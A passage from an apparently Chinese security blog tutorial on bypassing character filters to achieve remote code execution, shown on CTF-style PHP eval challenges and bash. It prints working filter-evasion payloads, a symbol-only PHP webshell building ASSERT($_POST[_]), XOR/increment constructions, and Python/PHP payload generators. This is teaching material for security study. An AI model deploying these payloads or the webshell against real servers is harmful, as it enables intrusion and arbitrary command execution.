<li><code>$&#123;?&#125;</code>表示上一条命令的退出状态，如果上一条命令异常 <code>$&#123;?&#125;</code>值为1，如果正常退出则为0</li>
<li><code>$&#123;_&#125;</code>表示上一个命令的最后一个参数。(如果上一个指令的输出是<code>0</code>的话，就能构造出sh了）</li>
</ul>
<p>如果是变量赋值的话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;!xxx&#125;//它表示用xxx的值作为另一个变量的名字，然后取出那个变量的值。</span><br></pre></td></tr></table></figure>

<p>本地测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/var/www/html# a=0</span><br><span class="line">root@VM-16-12-ubuntu:/var/www/html# echo $a</span><br><span class="line">0</span><br><span class="line">root@VM-16-12-ubuntu:/var/www/html# echo $&#123;!a&#125;</span><br><span class="line">bash</span><br></pre></td></tr></table></figure>

<p>成功拿到0，所以我们只需要一个变量值为0的变量，就可以拿到sh，然后我们看一下bashfuck的三种payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//bash_x</span><br><span class="line">Command:ls</span><br><span class="line">Charset : # $ &#x27; ( ) 0 1 &lt; \</span><br><span class="line">Total Used: 9</span><br><span class="line">Total length = 69</span><br><span class="line">Payload = $0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;</span><br><span class="line">$(( $((1&lt;&lt;1))#10011010 ))---&gt;# 2#10011010 = 154（十进制）</span><br><span class="line">$(( $((1&lt;&lt;1))#10100011 ))  # 2#10100011 = 163（十进制）</span><br><span class="line">---------------------------</span><br><span class="line">Charset : # $ &#x27; ( ) 0 &lt; \ &#123; &#125;</span><br><span class="line">Total Used: 10</span><br><span class="line">Total length = 117</span><br><span class="line">Payload = $0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">---------------------------</span><br><span class="line">Charset : ! # $ &#x27; ( ) &lt; \ &#123; &#125;</span><br><span class="line">Total Used: 10</span><br><span class="line">Total length = 147</span><br><span class="line">Payload = $&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p>使用<code>$(($((1&lt;&lt;1))#binary))</code>来表示任意数字，然后构造八进制转义。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而在上面的基础上，我们用 $&#123;##&#125; 来替换 1 ，用 $&#123;#&#125; 来替换 0</span><br></pre></td></tr></table></figure>

<p>就有了二三两种payload</p>
<p>然后将命令传入<code>$0</code></p>
<p>这个师傅很厉害，写了一个针对Linux终端 bashshell 的无字母命令执行的骚操作x的工具<a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/bashFuck">bashFuck</a></p>
<p>目前可以实现的字符集：</p>
<ul>
<li><code>#</code> <code>$</code> <code>&#39;</code> <code>(</code> <code>)</code> <code>0</code> <code>1</code> <code>&lt;</code> <code>\</code> (9 Charset)</li>
<li><code>#</code> <code>$</code> <code>&#39;</code> <code>(</code> <code>)</code> <code>0</code> <code>&lt;</code> <code>\</code> <code>&#123;</code> <code>&#125;</code> (10 Charset)</li>
<li><code>!</code> <code>#</code> <code>$</code> <code>&#39;</code> <code>(</code> <code>)</code> <code>&lt;</code> <code>\</code> <code>&#123;</code> <code>&#125;</code> (10 Charset)</li>
<li><code>!</code> <code>$</code> <code>&amp;</code> <code>&#39;</code> <code>(</code> <code>)</code> <code>=</code> <code>&lt; </code> <code>\</code> <code>_</code> <code>&#123;</code> <code>&#125;</code> <code>~</code> (13 Charset)</li>
</ul>
<h2 id="eval中无数字字母RCE-基础"><a href="#eval中无数字字母RCE-基础" class="headerlink" title="eval中无数字字母RCE(基础)"></a>eval中无数字字母RCE(基础)</h2><p>参考的是 P 神的文章<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
<p>什么是无数字字母RCE呢？具体题目代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>常规的无数字字母RCE主要有三种方式：</p>
<ol>
<li>异或</li>
<li>自增</li>
<li>取反</li>
</ol>
<p>一般当我们测出来过滤了数字字母之后，常规的函数套用和绕过都被限制住了，这时候又该怎么getshell呢？</p>
<p>首先我们要明确无数字字母RCE的思路就是两点</p>
<ul>
<li><p>通过非数字字母的字符经过各式各样的变换，最终能构造出我们需要的字母和数字</p>
</li>
<li><p>PHP<strong>可变函数</strong>执行的特点，意思就是我们可以通过变量来调用函数，可以通过将函数名存储在变量中，然后使用该变量来调用函数</p>
</li>
</ul>
<p>所以核心目的就是利用非数字字母的字符去构造函数，然后进行动态函数的执行</p>
<h3 id="自增构造"><a href="#自增构造" class="headerlink" title="自增构造"></a>自增构造</h3><p>首先我们先了解一下在php中的自增规则</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg" alt="14872693882387.jpg"></p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250307150508113.png" alt="image-20250307150508113"></p>
<p>所以我们这里只要拿到了一个变量值为a，那么就可以通过自增操作去构造出其他的字母，从而进行函数的构造，但是这个a怎么去拿呢？</p>
<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值返回为<code>Array</code>，Array的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250307151012457.png" alt="image-20250307151012457"></p>
<p>这里可以看到返回了一个Array，然后我们取第一个字符串就能拿到大写字母A了，然后我们试着构造一个assert(因为php是大小写不敏感的，所以不需要额外获取小写a)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造ASSERT($_POST[_]);</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//$_变成Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27; &#x27;</span>];<span class="comment">//利用布尔表达式返回[0]然后取出第一个字符A</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//存储A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//操作A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为AS</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为ASS</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//初始化为A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造E</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为ASSE</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为ASSER</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="comment">//存储为ASSERT</span></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="comment">//构造下划线</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//初始化为A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="comment">//存储为_p</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//初始化为A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="comment">//存储为_PO</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="comment">//构造S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="comment">//存储为_POS</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="comment">//构造T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="comment">//存储为_POST</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="comment">//存储为$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);<span class="comment">//ASSERT($_POST[_])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实只要能拿出一个大写字母A就可以通过自增构造出来了，我们本地测试一下</p>
<p>利用自增构造出phpinfo();</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27; &#x27;</span>];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$___</span>();</span><br></pre></td></tr></table></figure>

<p>由于存在 <code>+</code> 符号，故而需要进行 URL 编码然后再传入</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308102941513.png" alt="image-20250308102941513"></p>
<p>成功执行</p>
<h3 id="异或构造"><a href="#异或构造" class="headerlink" title="异或构造"></a>异或构造</h3><p>这也算是最简单的方法了，在PHP中异或的规则如下</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308103225029.png" alt="image-20250308103225029"></p>
<p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308103337996.png" alt="image-20250308103337996"></p>
<p>所以我们的思路就是通过两个非数字字母字符通过异或后得到一个字母，然后不断获取字母最后拼接成我们想要的函数</p>
<p>我们试一下</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308104042758.png" alt="image-20250308104042758"></p>
<p>可以看到这里异或就得出了字母A</p>
<p>然后这里的话找了师傅的一个脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个脚本可以找出两两字符异或后的所有可见字符的结果，然后写入一个文件中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t=f.readline()<span class="comment">#read one line at a time</span></span><br><span class="line">            <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:<span class="comment">#if the end of file is reached</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输入你想要构造的函数名和要执行的命令即可生成最终的 Payload，我们接下来试一下</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308111347135.png" alt="image-20250308111347135"></p>
<p>构造出phpinfo的异或结果，然后传入</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308111422570.png" alt="image-20250308111422570"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?c=(&quot;%0b%08%0b%09%0e%06%0f&quot;^&quot;%7b%60%7b%60%60%60%60&quot;)();</span><br></pre></td></tr></table></figure>

<p>为了更好的理解，我们去调试一下</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308113238817.png" alt="image-20250308113238817"></p>
<p>可以看到这里的话是遍历我们传入的需要异或的字符串的每个字符，然后将可以异或出来该字符的两个字符分别放在s1和s2，也就是我们payload里面异或符号两边的结果。</p>
<p>放一个yu22x师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your 